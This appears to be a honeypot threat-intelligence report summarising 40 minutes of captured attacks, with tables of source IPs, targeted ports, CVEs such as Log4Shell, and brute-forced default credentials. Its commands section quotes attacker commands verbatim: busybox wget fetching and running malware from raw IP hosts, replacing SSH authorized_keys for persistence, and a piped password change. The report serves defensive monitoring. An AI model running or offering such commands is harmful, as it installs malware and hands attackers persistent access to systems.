# Honeypot Attack Summary Report

## 1. Report Information

*   **Report ID:** `f4d3a1b0-c8e9-4f3a-b2c1-0d7e6a5b4c3d`
*   **Date of Generation:** 2025-10-26 10:00:00 UTC
*   **Time Period Covered:** 2025-09-29 01:20:01 UTC to 2025-09-29 02:00:01 UTC
*   **Data Sources:** `agg_log_20250929T012001Z.json`, `agg_log_20250929T014002Z.json`, `agg_log_20250929T020001Z.json`

## 2. Executive Summary

This report summarizes the findings from the analysis of honeypot data collected over a period of 40 minutes, from 01:20:01 UTC to 02:00:01 UTC on September 29, 2025. A total of 11,510 attacks were recorded across a distributed network of honeypots.

The majority of attacks were captured by the Cowrie (3,972), Suricata (3,308), and Honeytrap (2,455) honeypots. The most targeted services were SSH (port 22) and SMB (port 445), with a significant number of events also targeting port 8333 (Bitcoin).

The top attacking IP addresses were `24.35.235.198`, `147.182.150.164`, and `142.93.159.126`. Several vulnerabilities were targeted, with the most prominent being CVE-2021-44228 (Log4Shell). A variety of malicious commands were executed, including attempts to download and execute malware, modify system configurations, and establish persistent access.

## 3. Detailed Analysis

### 3.1. Attacks by Honeypot

The following table details the distribution of attacks across the different honeypot types:

| Honeypot      | Attack Count |
| :------------ | :----------- |
| Cowrie        | 3,972        |
| Suricata      | 3,308        |
| Honeytrap     | 2,455        |
| Ciscoasa      | 1,477        |
| Sentrypeer    | 48           |
| Dionaea       | 41           |
| Miniprint     | 36           |
| Redishoneypot | 31           |
| Tanner        | 31           |
| H0neytr4p     | 30           |
| Adbhoney      | 20           |
| Mailoney      | 16           |
| Honeyaml      | 16           |
| ConPot        | 10           |
| ElasticPot    | 9            |
| ssh-rsa       | 4            |
| Heralding     | 3            |
| Dicompot      | 3            |

### 3.2. Top 20 Attacking IP Addresses

The following table lists the top 20 IP addresses with the highest number of attacks:

| IP Address        | Attack Count |
| :---------------- | :----------- |
| 24.35.235.198     | 1462         |
| 147.182.150.164   | 1442         |
| 142.93.159.126    | 1242         |
| 185.156.73.166    | 381          |
| 185.156.73.167    | 379          |
| 92.63.197.55      | 362          |
| 92.63.197.59      | 344          |
| 88.210.63.16      | 341          |
| 213.32.245.214    | 243          |
| 134.122.46.149    | 163          |
| 156.227.234.29    | 159          |
| 35.154.30.25      | 159          |
| 80.75.212.83      | 98           |
| 103.181.143.216   | 105          |
| 172.245.163.134   | 87           |
| 129.13.189.204    | 63           |
| 103.176.78.149    | 90           |
| 3.149.59.26       | 49           |
| 3.130.96.91       | 50           |
| 130.83.245.115    | 43           |

### 3.3. Top 20 Targeted Ports

The following table lists the top 20 TCP/UDP ports targeted by attackers:

| Port      | Protocol | Attack Count |
| :-------- | :------- | :----------- |
| 445       | TCP      | 1457         |
| 22        | TCP      | 719          |
| 8333      | TCP      | 118          |
| 5060      | UDP      | 42           |
| 9100      | TCP      | 36           |
| 37777     | TCP      | 31           |
| 23        | TCP      | 38           |
| 80        | TCP      | 39           |
| 443       | TCP      | 30           |
| 6379      | TCP      | 19           |
| 8080      | TCP      | 10           |
| 2222      | TCP      | 14           |
| 25        | TCP      | 10           |
| 8888      | TCP      | 9            |
| 5006      | TCP      | 9            |
| 1139      | TCP      | 7            |
| 49152     | TCP      | 16           |
| 9700      | TCP      | 6            |
| 5672      | TCP      | 13           |
| 8008      | TCP      | 13           |

### 3.4. Targeted CVEs

The following CVEs were identified in the attack data:

*   CVE-2021-44228 (Log4Shell)
*   CVE-2002-0013
*   CVE-2002-0012
*   CVE-1999-0517
*   CVE-2019-11500
*   CVE-2024-12856
*   CVE-2024-12885
*   CVE-2001-0414

### 3.5. Top Credentials Used in Attacks

The following are the top credentials observed in brute-force and dictionary attacks:

| Username/Password               | Count |
| :------------------------------ | :---- |
| test/1234qwer                   | 3     |
| postgres/postgres               | 3     |
| pi/pi                           | 3     |
| 345gs5662d34/345gs5662d34       | 4     |
| admin/                          | 4     |
| vpnuser/12345                   | 3     |
| root/nima                       | 3     |
| root/Za123456                   | 3     |
| bot/12345                       | 3     |
| zabbix/zabbix                   | 2     |
| rancher/rancher123              | 2     |
| root/LeitboGi0ro                | 2     |
| oracle/abc123                   | 2     |
| user/1                          | 2     |
| root/abc123                     | 2     |
| ranger/ranger123                | 2     |
| centos/centos                   | 2     |
| root/123qweASD                  | 2     |
| git/qwerty123                   | 2     |
| docker/docker                   | 2     |

### 3.6. Commands Executed by Attackers

The following commands were executed on the honeypots, indicating the attackers' intent:

*   `uname -a`
*   `/ip cloud print`
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `echo -e "musa123\\nDDqneYZsGZps\\nDDqneYZsGZps"|passwd|bash`
*   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`
*   `cd /data/local/tmp/; busybox wget http://64.188.8.180/w.sh; sh w.sh; ...`

The commands show a clear pattern of reconnaissance (`uname`, `lscpu`), attempts to establish persistent access by adding SSH keys, and downloading and executing malware.

## 4. Notes and Limitations

*   The data in this report is based solely on the logs from the deployed honeypots and may not be representative of all attack traffic on the internet.
*   The IP addresses listed are the source of the attacks, but they may be compromised systems or proxies used by the actual attackers.
*   The report provides a snapshot of the threat landscape during a specific time window and should be considered in the context of ongoing monitoring and analysis.
*   The "interesting" and "dropped" fields from the raw logs have been excluded from this summary for brevity, but they contain valuable information for further investigation.

This report provides a high-level overview of the attacks recorded by the honeypot network. Further analysis is recommended to understand the attackers' tactics, techniques, and procedures in more detail.
